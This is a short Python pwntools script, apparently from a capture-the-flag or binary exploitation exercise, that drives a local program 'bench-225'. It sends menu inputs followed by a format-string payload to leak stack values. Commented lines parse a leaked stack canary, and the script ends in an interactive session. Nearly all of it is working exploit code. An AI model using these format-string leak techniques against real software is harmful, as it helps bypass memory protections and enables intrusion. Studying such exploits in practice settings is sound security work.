import pwn

p = pwn.process(["bench-225"])

# p.send(b"3\n3\n3\n3\n3\n4\n4\n4\n4\n4\n4\n6\n" + b"%016llX" + b"\n")
p.send(b"3\n3\n3\n3\n3\n4\n4\n4\n4\n4\n4\n6\n" + b"%llu %llu %ld" + b"\n")
#1e6e
# p.recvuntil("te: ")
# can = bytes.fromhex(p.recvline(keepends=False).decode())

p.interactive()
